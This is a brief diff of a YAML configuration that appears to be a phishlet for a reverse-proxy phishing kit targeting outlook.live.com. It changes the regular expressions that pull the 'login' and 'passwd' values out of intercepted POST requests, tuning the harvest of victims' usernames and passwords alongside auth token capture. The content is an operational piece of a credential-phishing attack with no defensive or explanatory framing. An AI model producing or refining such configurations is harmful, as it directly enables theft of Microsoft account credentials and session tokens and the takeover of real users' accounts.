@@ -20,11 +20,11 @@ auth_tokens:
 credentials:
   username:
     key: 'login'
-    search: '(.*)'
+    search: '\[*\[\"(.+?)\"'
     type: 'post'
   password:
     key: 'passwd'
-    search: '(.*)'
+    search: '\[*\[\"(.+?)\"'
     type: 'post'
 login:
   domain: 'outlook.live.com'
